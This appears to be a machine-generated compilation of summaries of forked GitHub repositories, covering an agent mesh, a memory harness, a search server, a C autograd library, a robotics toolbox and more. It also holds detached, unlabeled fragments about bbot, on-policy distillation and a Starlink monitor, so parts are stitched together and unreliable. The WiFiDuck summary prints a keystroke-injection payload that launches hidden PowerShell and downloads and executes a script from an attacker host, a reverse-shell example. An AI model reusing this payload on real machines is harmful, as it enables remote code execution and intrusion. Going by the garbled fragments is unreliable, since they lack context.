sam implements a Sovereign Agent Mesh that provides zero‑configuration discovery and zero‑trust communication for lightweight sam-node processes.  
 The control‑plane server (cmd/sam-control-plane/main.go) stores node identities, authorisation policies, and routes MCP (Mesh Control Protocol) requests.  
 cmd/sam-router/main.go runs libp2p bootstrap and relay services that forward traffic between nodes.  
 cmd/sam-node/main.go launches a local side‑car that registers with the control plane, establishes encrypted libp2p links, and exposes an HTTP‑compatible MCP endpoint for agents.  

All components are written in Go (96 files) and orchestrated with Helm charts under charts/sam-mesh/ and Dockerfiles (Dockerfile.sam‑node, Dockerfile.sam‑router, etc.). The repository also ships example MCP services (e.g., development/examples/calc-mcp/) that demonstrate how an agent can call a remote tool through the mesh.

How To Use It  

Setup – Build the binaries or containers. The repo supplies a Makefile and Dockerfiles, so either of the following works:

Build Go binaries locally
make build          # targets compile cmd/ into ./bin/
or build Docker images
docker build -f Dockerfile.sam-control-plane -t sam-control-plane .
docker build -f Dockerfile.sam-router       -t sam-router .
docker build -f Dockerfile.sam-node         -t sam-node .

Configuration – Minimal config is required. The control plane reads internal/controlplane/config.go which defaults to development/kind/mesh-config.yaml. For a quick local deployment, run the Kind script:

cd development/kind
./run.sh           # creates a Kind cluster, applies the mesh manifests

If you prefer a non‑Kubernetes run, start each component with its default flags:

./bin/sam-control-plane &
./bin/sam-router &
./bin/sam-node -config development/kind/sam-node-config.yaml

Running – The mesh becomes reachable at the node’s MCP address (default http://127.0.0.1:8080/mcp). An agent can invoke a tool with a simple HTTP POST; the example calc-mcp service shows the request shape in development/examples/calc-mcp/calcserver.py.

curl -X POST http://127.0.0.1:8080/mcp \
  -d '{"tool":"calc/add","args":{"a":2,"b":3}}'

Real‑World Use  
A SaaS platform that runs many LLM‑based workers can spin up a sam-node per worker. Each node registers with a shared sam-control-plane, receives a signed biscuit token (internal/identity/biscuit.go), and discovers peers automatically. When a user request requires a specialized tool (e.g., code review), the platform routes the call through the mesh to the appropriate node, leveraging the built‑in rate‑limiter (internal/node/ratelimiter.go) and policy checks.

client := http.NewRequest("POST", "http://localhost:8080/mcp", payload)
resp,  := http.DefaultClient.Do(client)
// resp contains tool output from the selected peer node

Code Health & Issues  
High – Secrets in repo – charts/sam-mesh/templates/secrets.yaml contains placeholder values that could be replaced with real credentials; committing real secrets would be a security risk.  
Medium – Limited test coverage for CLI flags – cmd/ binaries have no dedicated unit tests; most tests focus on internal packages (internal/node/). CI runs go test ./... but flag parsing bugs could slip through.  
Medium – Platform‑specific code paths – Files like cmd/sam-node/daemonizeunix.go and daemonize_windows.go are conditionally compiled; no cross‑OS CI matrix is evident, so Windows behaviour is unverified.  
Low – Documentation gaps – README provides a high‑level overview but lacks explicit command‑line flag documentation; users must read source (internal//config.go) to discover required env vars.  
Low – Helm chart defaults expose plain text secrets – The secrets.yaml template renders values directly into Kubernetes secrets without encryption; Helm users must supply a secure secret management process.  

Overall the repo includes a full CI pipeline (.github/workflows/.yaml), static analysis (.golangci.yml), and a vulnerability scan (govulncheck.yml). Tests (44 files) exercise core mesh logic, and the code follows Go module best practices (go.mod, go.sum).

The Bottom Line  
sam delivers a functional, Go‑native mesh for AI agents with strong identity guarantees and ready‑made Docker/Helm deployment options. It is most suitable for teams comfortable with Go and Kubernetes who need a self‑service, zero‑trust communication layer. forks.name: hipocampus
forks.description: Drop-in memory harness for AI agents — 3-tier memory, compaction tree, hybrid search. One command to set up. Works with Claude Code and OpenClaw.
forks.summary:
The Problem

AI agents lose context between sessions. Search-based retrieval (BM25, vector) only works when you know what to look for—it fails on implicit context where the user never mentions the relevant topic. The repo's own benchmark shows search alone scores 2.8% on implicit recall tasks versus 0.8% with no memory at all.

What This Does

hipocampus is a file-based memory layer that maintains a 3-tier hierarchy: templates/WORKING.md for active state, templates/MEMORY.md for consolidated knowledge, and a ROOT.md that holds a compacted topic tree. A compaction process (cli/compact.mjs) periodically summarizes older context into higher-level topics, so the agent retains a holistic view without keeping full history in context.

The system hooks into agent sessions via hooks/session-start.sh and platform-specific skill files under platforms/ (Claude Code, OpenCode, OpenClaw). Five skills in skills/ define the agent's memory behaviors: recall, search, compaction, flush, and a core skill that ties them together.

How To Use It

Setup — Install via the Claude Code plugin marketplace or standalone npm:

npx hipocampus init

Options include --no-vector (BM25 only, saves ~2GB) and --no-search (compaction tree only).

Configuration — No environment variables required. The system is file-based; templates in templates/ define the memory structure. The ROOT.md budget (3K vs 10K tokens) is a key tuning parameter—the benchmark shows larger budgets improve recall on easy/medium questions.

Running it — After init, the session-start hook loads memory into agent context automatically. The compaction CLI (cli/compact.mjs) runs to consolidate older entries. Platform-specific skills tell the agent when and how to use each memory layer.

Real-World Use

A developer works with an agent across weeks on an API. Session logs contain a decision about token-bucket rate limiting, but the user never mentions it again. When the user later asks to "refactor the payment endpoint," the compaction tree in ROOT.md surfaces the rate-limiting topic as related context—something search cannot do because no query connects "payment flow" to "rate limiting."

Med — No CI/CD pipeline — no .github/ or CI config exists, so there's no automated test gate. Five test files exist (cli/compact.test.mjs and others), but nothing runs them automatically.

Low — Single maintainer — forked from a 177-star repo; no contributor signals.

The Bottom Line

The core idea is sound: a compaction tree that maintains a holistic topic map is genuinely better than search for implicit recall, and the benchmark numbers support it. The implementation is lightweight—mostly Markdown prompts and a small CLI—which makes it easy to audit but means the "memory" is only as good as the agent's adherence to the skill definitions. Worth trying for teams running Claude Code or OpenCode on long-lived projects where context persistence matters, but treat the benchmark numbers as indicative rather than definitive until independently reproduced.

forks.name: string-search-server
forks.description: High-performance TCP string-search server in Python: multiple search algorithm implementations, SSL auth, concurrent connections, and a benchmark harness.
forks.summary:
The Problem

Searching large text files over a network typically means either loading the entire file into memory or shipping the file to the client. Both approaches waste bandwidth and RAM. This project addresses that gap with a dedicated TCP server that performs the search server-side and returns only the matching lines, with SSL for transport security and multiple search strategies to handle different file sizes and query patterns.

What This Does

The repo implements a concurrent TCP server (src/server.py) that accepts search queries, runs them against a configured text file, and returns matching lines. Search logic lives in src/searchalgorithms.py, which provides five strategies: set-based (cached mode, small/medium files), memory-mapped (large files), simple linear scan, regex, and a grep subprocess fallback. A client (src/client.py) and benchmark harness (src/benchmark.py) round out the tooling.

Configuration is handled through an INI file (config/server.conf) that controls the target file, host/port, SSL settings, and whether the file is reread on each query or cached in memory. The codebase is small—8 Python files—and includes a test suite (tests/testserver.py) plus type annotations configured via mypy.ini.

How To Use It

Setup: Python 3.11+ is required. Install dependencies with pip install -r requirements.txt. A locked version file (requirements.lock.txt) exists for reproducible production installs.

Configuration: Edit config/server.conf to point at your search file and set host/port/SSL options. The README documents the format: [search] filepath, [server] host/port, [security] sslenabled/certpath/keypath.

Running it:

python -m src.server config/server.conf

Query from a client:

python -m src.client --host localhost --port 44445 --ssl true --query "search string"

Run tests with pytest tests/. The repo includes a sample data file (200k.txt) for immediate testing.

Real-World Use

A log-aggregation service could deploy this behind a load balancer, with each node caching a shard of log data and serving search queries for a specific time range. The memory-mapped search mode handles files too large for RAM, and the reread-on-query option supports rotating log files without server restarts. For a single-host deployment, the systemd unit file (config/string-search.service) provides a straightforward path to running it as a managed daemon.

Code Health & Issues
Med – No CI pipeline: No .github/ or CI config exists, so there's no automated gate for tests or type checks. mypy.ini exists but nothing enforces it.
Med – No LICENSE: The README states "All rights reserved," which makes reuse legally ambiguous. This blocks most commercial or open-source adoption.
Low – No lockfile for production: requirements.lock.txt exists, but the README install path uses requirements.txt, which lacks pinned versions. Use the lockfile for deployments.
Low – Sample data in repo: 200k.txt is a test artifact; verify it's not accidentally shipping sensitive data.
Positive: Tests exist (tests/test_server.py), type annotations are used throughout, and the code is organized with clear separation between server, client, algorithms, and benchmark logic.

The Bottom Line

This is a focused, working solution for network-based text search with sensible performance options and SSL support. It's well-structured for its size, but the missing license and CI are real barriers to production adoption. Suitable for internal tooling or as a reference implementation for custom search servers; not a drop-in replacement for a full-text search engine like Elasticsearch.

forks.name: bare-lm
forks.description: lightweight autograd lib in C
forks.summary:
The Problem

Training small neural networks in C typically means either hand-writing backpropagation for each model or pulling in a heavyweight framework. bare-lm addresses that gap with a minimal autograd engine that tracks the computation graph, computes gradients, and runs SGD—all in C with no Python dependency.

What This Does

bare-lm is a compact tensor library with automatic differentiation. The core lives in src/bare.c and src/bare.h. It provides Tensor, Linear, and a ParameterList for tracking trainable weights. Operations like lineart, relut, sigmoidt, and mselosst build a graph that backward() traverses in topological order.

Two memory arenas (permanent and temporary) handle all allocations. Temporary tensors are freed with a single resettempmem call—no per-tensor cleanup. The library links against OpenBLAS for matrix operations.

The examples/ folder shows three working models: xor.c (2-layer MLP), mnist.c (image classification), and attention.c (attention mechanism). benchmark/ contains timing and memory allocation tests.

How To Use It

Setup: Build from source with make. OpenBLAS headers and library are required. On macOS, set OPENBLASPREFIX=/opt/homebrew/opt/openblas; on Linux, plain make works. make install places bare.h in /usr/local/include and libbare in /usr/local/lib.

Running it: Compile against the installed library:

cc file.c -lbare

The README's XOR example is the canonical usage pattern: create a Memory arena, build a ParameterList, construct layers, run forward/backward in a loop, call sgdstep, then resettempmem.

Configuration: No config files or environment variables. The only tunable is arena size passed to createglobalmem.

Real-World Use

bare-lm fits embedded or low-level systems where Python isn't an option. A sensor-fusion device could run a small MLP for anomaly detection directly in firmware. The checkpoint functions (savecheckpoint/loadcheckpoint) persist trained weights, so you can train on a host machine and deploy the weights to the device. The mnist.c example demonstrates a realistic training workload.

Code Health & Issues
High - No LICENSE file - Usage and redistribution rights are unclear. This blocks commercial adoption until resolved.
Medium - Single test file - examples/test.c is the only test. The autograd engine's gradient correctness and edge cases (empty tensors, shape mismatches, numerical stability) are largely unverified.
Medium - No CI - Only a release workflow exists in .github/workflows/release.yml; there's no automated build or test pipeline. Regressions won't be caught.
Low - Manual memory management - The arena approach is sound, but Memory sizing (1 << 28 = 256MB) is hardcoded in examples. Large models will require manual tuning.
Low - Error handling - No evidence of shape validation or null checks in the API. Invalid inputs likely cause undefined behavior.

The Bottom Line

A genuinely useful minimal autograd library for C—the arena-based memory model and clean op API are well designed. It's appropriate for small models in embedded or systems contexts, but the missing license, sparse tests, and absent CI make it unsuitable for production without hardening. Worth evaluating for prototyping or as a reference implementation.

forks.name: WiFiDuck
forks.description: Wireless keystroke injection attack platform
forks.summary:
The Problem  
Security trainers and penetration‑test teams need a low‑cost, easily programmable BadUSB that can be re‑programmed on‑the‑fly without opening the device or flashing a new binary each time. Existing solutions require SD cards or recompilation, which slows iteration and makes classroom demos cumbersome.

What This Does  
WiFi Duck turns an ATmega32U4 or ESP8266 board into a wireless USB keyboard that serves a tiny web UI for script management.  
 The ATmega firmware lives in atmegaduck/atmegaduck.ino and its support library (keyboard.cpp/h, duckparser.cpp/h). Scripts are parsed by duckparser.cpp and sent as HID reports via usbhidkeys.h.  
 The ESP8266 side (espduck/espduck.ino) hosts the web server (webserver.cpp/h), stores scripts in SPIFFS (spiffs.cpp/h), and forwards commands to the ATmega over serial (serialbridge.cpp/h).  
 The front‑end (web/index.html, web/index.js, web/terminal.js, etc.) provides a code editor, file manager and “run” button that hits the ESP’s REST endpoints.

How To Use It  

Setup  
Install the Arduino IDE (or VS Code Arduino extension).  
Add the Arduino AVR Boards and ESP8266 cores via Boards Manager.  
Open the appropriate sketch:  
    atmegaduck/atmegaduck.ino for a pure ATmega32U4 board.  
    espduck/espduck.ino for an ESP‑8266‑based WiFi Duck.  
Select the target board (e.g., Arduino Leonardo for ATmega, NodeMCU 1.0 for ESP8266) and compile/upload.

Example for ESP8266
arduino-cli compile --fqbn esp8266:esp8266:generic espduck/espduck.ino
arduino-cli upload -p /dev/ttyUSB0 --fqbn esp8266:esp8266:generic espduck/espduck.ino

Configuration  
 Wi‑Fi SSID and password are stored in espduck/config.h. Edit the WIFISSID and WIFIPASS macros, then re‑flash.  
Script files are kept in SPIFFS; the web UI writes directly to /scripts/ via the REST API defined in espduck/duckscript.cpp. No external config files are required.

Running  
Power the device and connect a laptop to the AP wifiduck / wifiduck.  
Browse to http://192.168.4.1.  
Use the Editor tab to write a Ducky Script (e.g., STRING hello world).  
Click Save → Run; the ESP forwards the script to the ATmega (serialbridge.cpp) which injects keystrokes via the HID driver.

Real‑World Use  
A red‑team instructor can preload a payload that opens a reverse shell on any Windows host:

DELAY 1000
GUI r
DELAY 200
STRING powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
ENTER

The script is edited on a laptop, saved through the web UI, and executed instantly on the target PC when the device is plugged in—no SD card swaps, no recompilation.

Code Health & Issues  
Medium – Lack of CI/CD – No GitHub Actions, Travis, or other pipelines; builds must be performed manually (.github only contains issue templates).  
Low – Minimal test coverage – Only a single test.script file; no unit tests for parser or HID output.  
Medium – Hard‑coded Wi‑Fi credentials – config.h stores SSID/password in source; changing them requires a re‑flash, limiting dynamic reconfiguration.  
Low – Documentation gaps – README covers usage but does not detail the build environment (Arduino core versions, required libraries).  
Medium – Potential buffer overflow – duckparser.cpp parses arbitrary script length into fixed‑size buffers without explicit length checks.  
Low – License present – LICENSE is included, so reuse is permitted.  

The Bottom Line  
WiFi Duck provides a functional, low‑cost wireless BadUSB platform with a convenient web‑based script editor, making it valuable for training and quick proof‑of‑concept attacks. The codebase compiles with the Arduino toolchain, but the project lacks automated testing, CI, and runtime configurability, which raises maintenance overhead for production use. Teams comfortable with manual builds and willing to audit the parser can adopt it; larger organizations should address the highlighted risks before deployment.

forks.name: open-kritt
forks.description: Open-source, self-hosted AI vulnerability research tool that orchestrates agents to find and validate security issues in code.
forks.summary:
The Problem

Security researchers and developers need to find code vulnerabilities at scale, but pointing a single model at an entire repository produces noisy, unverified results. open·kritt addresses this by breaking research into focused, parallelizable tasks, then de-duplicating and ranking findings with configurable validation. It is built for teams that need control over prompts, model providers, and workflow orchestration rather than opaque, black-box scanning.

What This Does

open·kritt is a self-hosted platform comprising a Node.js backend (73 files under backend/) and a React documentation/site frontend (56 files under docs-site/). The backend orchestrates agent workflows, manages scan state, and handles findings serialization. Core infrastructure includes Prisma ORM with 38 database migration files under database/init/, Docker Compose for local development (docker-compose.yml, docker-compose.dev.yml), and npm-managed dependencies (backend/package.json). Scans analyze remote or local repositories using model providers including Codex, Claude Code, OpenAI, Anthropic, and OpenRouter. Findings are enriched via post-scripts, ranked by custom severity rankers, and exported as ZIP archives with manifests through backend/src/lib/serialize.js. The workflow builder and step configuration live in backend/src/lib/defaultWorkflows.js and backend/src/lib/defaultSeverityRankers.js.

How To Use It

Setup: Clone the repository and run ./kritt setup to configure model access (Codex login or OpenAI/Anthropic/OpenRouter API keys). The .env.example at the root and backend/.env.example provide template configuration. A GITHUBTOKEN is optional for private repos.

Configuration: Required environment variables and API keys are defined in .env.example and backend/.env.example. The Prisma schema is at backend/prisma/schema.prisma with migrations in backend/prisma/migrate.js.

Running it: Start the full stack with ./kritt start (Docker Compose) or use the headless CLI with ./kritt-headless for server-only operation. The web UI runs at http://localhost:5173. Scans are created via the backend routes under backend/src/routes/ (scans, generations, vulnerabilities, workflows).

Real-World Use

A security team can define a workflow in JSON under backend/src/lib/defaultWorkflows.json, pointing at a private codebase via GITHUBTOKEN, and trigger a scan that parallelizes focused prompts across multiple agents. Post-scripts in backend/src/lib/defaultPostScripts.js validate findings, generate proofs-of-concept, and enrich the schema before export. Results including de-duplicated findings, severity rankings, and PoC source are packaged in a ZIP with a share-safe manifest—completed scans produce full exports, failed or stopped scans produce partial exports with clear markings.

Code Health & Issues
Tests: 23 test files exist under backend/test/ covering accounts, model providers, environment files, and scan pagination—CI is configured via .github/workflows/ci.yml and .github/workflows/release.yml.
License: AGPL-3.0 is present in LICENSE; the repo includes CODEOFCONDUCT.md, CONTRIBUTING.md, and SECURITY.md.
Dependency hygiene: backend/package-lock.json is committed, and Dependabot is configured via .github/dependabot.yml.
Structural concerns: The separation between backend services, database migrations, and the docs-site is clear. No obvious unsafe patterns are visible in the file listing, but the AGPL-3.0 license requires derivative works to remain open source, which is a consideration for commercial adoption.
Missing evidence: No runtime security scanning or secrets-detection configuration is apparent beyond the .env.example templates.

The Bottom Line

open·kritt is a well-structured, self-hosted vulnerability research platform that trades ease-of-use for control—researchers define workflows, choose models, and retain full ownership of findings and reports. The AGPL license, Docker-based deployment, and robust test/CI suite make it suitable for teams that can self-host and need custom prompt orchestration. It is less appropriate for users seeking a hosted, turnkey solution or those restricted by AGPL compliance requirements.

forks.name: robotics-toolbox-python
forks.description: Robotics Toolbox for Python
forks.summary:
The Problem

Robotics research and education requires significant boilerplate for kinematics, dynamics, and visualization. Researchers often hand-roll transformation math, inverse kinematics solvers, and robot model loaders, which leads to inconsistent results and wasted effort. This toolbox consolidates those primitives into one Python package.

What This Does

robotics-toolbox-python is a Python framework for robot kinematics, dynamics, and trajectory generation. It provides spatial math operations, robot model definitions (DH and ETS-based), inverse kinematics solvers, and visualization backends. The repo includes a companion rtb-data package with robot-specific data files.

The core library lives in the root package with 46 Python files. The examples/ directory (34 files) shows real usage patterns: pumajtraj.py for trajectory generation, ikineevaluate.py for inverse kinematics benchmarking, and rnecompare.py for dynamics validation. The docs/ folder contains extensive Sphinx documentation and Jupyter notebooks covering kinematics, dynamics, and symbolic computation.

The rtb-data/rtbdata/armerxarm/ subpackage demonstrates the data format: it bundles URDF/Xacro files, STL meshes, ROS launch files, and Python model definitions for the xArm 6 robot.

How To Use It

Setup: Install via pip. The pyproject.toml declares dependencies (numpy, scipy, matplotlib, spatialmath-python). No lockfile is present, so use pip install roboticstoolbox-python or pin versions manually for reproducible builds.

Running it: The primary entry point is the Python API. Start with the examples:

pip install roboticstoolbox-python
python examples/pumajtraj.py
python examples/robots.py

The examples/readme.py file mirrors the README's quickstart. For interactive exploration, the docs provide JupyterLite notebooks that run in-browser without local setup.

Configuration: No environment variables or config files are required for basic use. Robot models are loaded from the package's built-in definitions or from URDF files via the ERobot class.

Real-World Use

A typical workflow: load a robot model, compute forward kinematics, solve inverse kinematics, and generate a trajectory.

import roboticstoolbox as rtb
from spatialmath import SE3

robot = rtb.models.DH.Panda()
T = SE3(0.5, 0.0, 0.3) * SE3.RPY([0, 0, 0])
sol = robot.ikineLM(T)
traj = robot.jtraj(robot.qz, sol.q, 50)

Code Health & Issues
Low - No dependency lockfile - pyproject.toml declares version ranges but no pinned versions, so builds are not fully reproducible across environments.
Low - Branch structure - This repo is a fork of petercorke/robotics-toolbox-python (3,360 stars upstream). The 0-star fork status suggests this is either a personal copy or a work-in-progress branch; verify it tracks upstream before relying on it.
Low - Test coverage - Only 3 test files exist, which is thin for a library this size. The upstream project has more extensive tests, so this fork may lag on test coverage.
Low - Bundled data package - rtb-data contains STL meshes and URDF files. Verify licensing of these assets if you redistribute them; the LICENSE files are present but should be reviewed.

CI is configured via GitHub Actions (.github/workflows/ci.yml), and the project uses release-please for automated versioning. The documentation is extensive and well-structured.

The Bottom Line

This is a mature, well-documented robotics library with a solid API design and active upstream maintenance. The fork status is the main concern - if you need production support, use the upstream repo directly. For research, education, or prototyping, this is a practical choice that saves substantial implementation time. The missing lockfile and thin test suite are minor issues for a library of this scope.

Teams building or researching on‑policy distillation (OPD) for large language models need a single, up‑to‑date source that aggregates papers, reports, and open‑source implementations. Scattered references waste time and increase the risk of missing recent industrial recipes.

pipx install bbot

docker build -t bbot -f Dockerfile .

Configuration  
 Global defaults are in bbot/defaults.yml.  
 API keys for modules are added under the modules section of a preset file (see the subdomain‑enum.yml example in the README).  
 Runtime options (DNS thread counts, resolver list, etc.) are configurable in the same preset or via CLI flags (-c key=value).

Basic sub‑domain enumeration
bbot -t example.com -p subdomain-enum

Use a custom preset
bbot -t example.com -c preset=custom.yml

Stream results to Neo4j
bbot -t example.com -p subdomain-enum -o neo4j

forks.name: TraceAnything
forks.description: [ICLR 2026] Trace Anything: Representing Any Video in 4D via Trajectory Fields
forks.summary:
The Problem

Videos are typically processed as sequences of independent frames or as static 3D reconstructions, which loses temporal continuity. Tracking arbitrary points across a video—whether for editing, 3D reconstruction, or scene understanding—requires either expensive per-frame correspondence matching or specialized trackers that don't generalize well. Trace Anything addresses this by representing an entire video as a continuous 4D trajectory field: each pixel maps to a parametric 3D trajectory across all frames, computed in a single forward pass.

What This Does

Trace Anything is a PyTorch model that takes a video, image pair, or unstructured image set and outputs dense per-pixel 3D trajectories. The core architecture lives in traceanything/traceanything.py, with supporting components in traceanything/layers/ (attention blocks, patch embedding, positional encoding) and traceanything/heads.py for output heads. The model builds on the Depth Anything architecture and is designed for interactive 3D visualization.

The repo is inference-only—there is no training code. Three scripts drive the workflow: scripts/infer.py for trajectory estimation, scripts/view.py for the interactive 3D viewer, and scripts/usermask.py for user-guided masking. Example inputs under examples/input/ include single-frame pairs (dog, corgi) and multi-frame sequences (elephant, monkeys, parkour, cabinet). Configuration is handled by configs/eval.yaml.

How To Use It

Setup: Clone the repo, create a Python 3.10 conda environment, and install dependencies. The README specifies pip install einops omegaconf pillow opencv-python viser imageio matplotlib torchvision. PyTorch must be installed separately per your CUDA setup (tested with CUDA 12.8).

Model weights: Download traceanything.pt from Hugging Face and place it at checkpoints/trace_anything.pt.

Running inference:

python scripts/infer.py --config configs/eval.yaml

The configs/eval.yaml file defines input paths and model parameters. The README does not document exact CLI flags beyond the script names, so you may need to inspect scripts/infer.py for argument details. The interactive viewer is launched via scripts/view.py. GPU memory requirement is substantial: 48 GB VRAM for the provided examples.

Real-World Use

A practical workflow: ingest a video sequence (e.g., the examples/input/monkeys/ frames), run scripts/infer.py to generate trajectory fields, then load the output in scripts/view.py to inspect per-pixel trajectories in 3D. This suits video editing pipelines where you need to propagate masks or edits across frames, or as a preprocessing step for 4D reconstruction where per-pixel correspondences are required.

Prerequisites – Node ≥ 18, npm (or npm ci‑compatible lockfile).  
Install – From the repository root:  

   npm ci               # installs exact versions from package-lock.json
Build – The root package.json defines a build script (inspect scripts field). Typical command:  

   npm run build        # compiles TypeScript, bundles Electron and extension
Run Desktop – Electron’s main process is electron/main.ts. The package.json usually provides an electron script:  

   npm run electron     # starts the desktop app

  

   Alternatively, launch directly with npx electron . after the build step.  
Run Extension – Load the unpacked extension from the extension/ folder in Chrome/Edge/Firefox. The UI entry point is extension/entrypoints/dashboard/index.html.  
Run Landing Site (optional) –  

   cd landing
   npm ci
   npm run dev        # Astro dev server, http://localhost:4321

  

No environment variables are required for basic monitoring; optional Starlink‑account integration prompts for credentials at runtime and stores them locally.

Real‑World Use  
A home‑office router runs Dishylink on a Windows laptop. The Electron UI shows live downlink/uplink, latency spikes, and a 3‑D obstruction dome. When the ISP experiences an outage, the app continues recording locally, and the user can later review the collector/.mts logs to pinpoint the exact minute the dish lost GPS lock. A small script could ingest those logs into a home‑assistant dashboard:

import { readHistorical } from './collector/historian.mts';
const data = await readHistorical('2024-08-01');
console.log(Total downtime: ${data.totalOutageMinutes} min);

Code Health & Issues  
Bugs / Risks  
Med – Unvalidated network payloads – electron/ipc.ts forwards raw dish responses; missing schema checks could cause crashes on malformed data.  
Low – Platform‑specific plist – collector/com.dishylink.historian.plist is macOS‑only; Windows/Linux builds may lack equivalent service registration.  
SDLC / Code Violations  
Low – Missing explicit run scripts in README – No documented npm run start or npm run electron commands; users must infer from package.json.  
Low – No secret management – Optional Starlink credentials are stored locally without encryption; not a security flaw for a personal tool but worth noting.  
Low – Dependency hygiene – No automated Dependabot or npm audit in CI; security updates must be applied manually.  

Overall the repository includes unit tests (.test.ts, .test.mts), a CI workflow (.github/workflows/ci.yml), lockfiles, and a permissive MIT license, indicating a mature baseline.

The Bottom Line  
Dishylink delivers a fully offline, cross‑platform Starlink monitor with a polished Electron UI and optional browser extension. The codebase is well‑structured and test‑covered, though users must rely on standard npm conventions for building and launching. Ideal for technically inclined Starlink owners who need local, uninterrupted visibility into dish performance; less suitable for teams that require formal onboarding docs or automated security scanning.

forks.name: ordinus

The Problem

The pain point is the lack of a local-first command center that connects these agents to existing tools while keeping data on-premise.

What This Does

Ordinus is a local-first Electron desktop app (200 files, primarily in app/) that lets you compose AI agents from your local Codex/Claude CLIs into scheduled workflows. The core app lives in app/ with Electron Vite configuration (app/electron.vite.config.ts) and builder setup (app/electron-builder.yml). It uses SQLite for persistence via Drizzle ORM (app/drizzle.config.ts) with 51 migration files in app/resources/db/migrations/ defining the data model. A Workflow Designer (app/resources/screenshots/workflow-designer.png per README) visually wires agents and tasks into a DAG that compiles to runnable plans. The app/resources/google-mcp/ directory provides Google API integration (Gmail, Calendar, Drive) with OAuth credentials stored encrypted on machine. Agent profiles and skills are configured through YAML files in .claude/skills/ and .codex/skills/ directories, with openai.yaml runtime adapters for each skill. Connections run under your own accounts—Google, WhatsApp, and X credentials are stored encrypted locally, not in the cloud.

How To Use It

Setup: Install from the latest release (ordinus-<version>-setup.exe for Windows, Ordinus-<version>.dmg for macOS). The app is Electron-based with npm dependencies (app/package.json). First-launch on macOS requires stripping the quarantine attribute: xattr -dr com.apple.quarantine /Applications/Ordinus.app then open /Applications/Ordinus.app. Windows launches through SmartScreen with "More info → Run anyway."

Configuration: Environment variables and API keys are configured within the app UI for each connection type. The Google MCP integration lives in app/resources/google-mcp/ with server.mjs, tools.mjs, and auth.mjs. No .env files are visible in the repo structure, suggesting config is managed through the app's internal settings rather than file-based env vars.

Running it: Launch the Ordinus desktop application. No CLI entry point is exposed in the repository structure—the primary interface is the Electron app itself.

Real-World Use

A knowledge worker composes an "article writer" agent with a profile from app/resources/profiles/content-production/article-writer.md, wires it through the Workflow Designer (app/resources/screenshots/workflow-designer.png) to fetch research from Google Calendar and draft in Gmail, then schedules the DAG to run nightly. The same engine handles manual runs and scheduled executions, with the Workboard (app/resources/screenshots/workboard.png) showing real-time provider output and allowing runtime steering. The agent's conversation space persists locally via SQLite migrations.

Code Health & Issues
Build & CI: GitHub Actions workflows present (.github/workflows/ci.yml, .github/workflows/release.yml) with Electron builder release pipeline. No structural red flags detected—tests, CI, license, and lockfiles are where expected.
SQLite migrations: 51 migration files in app/resources/db/migrations/ indicate a evolving schema; migration 0048 drops workspacename and ordinusdisplay_name columns, suggesting a recent refactor that may require data migration attention.
Electron signing: Builds are unsigned (README explicitly notes this), causing Gatekeeper/SmartScreen prompts on first launch—acceptable for local-first tools but impacts deployment friction.
No visible test files: Only 1 test file found in the structure; test coverage is minimal or the tests are stored elsewhere.
Dependency hygiene: app/package-lock.json present, but no npm audit or security scanning evidence in the CI workflows observed.

The Bottom Line

Ordinus is a competent local-first Electron app for composing and scheduling AI agents backed by your own CLIs and connected to your existing tools—Google, WhatsApp, X—with data staying on your machine. It's well-structured for its scope but limited by unsigned builds, sparse test coverage, and a migration set that's seen recent structural changes. Best for individual or small team users who want a desktop interface for agent workflows without cloud dependencies; less suited if you need rigorous CI/CD or multi-user deployment out of the box.

forks.name: StackChan
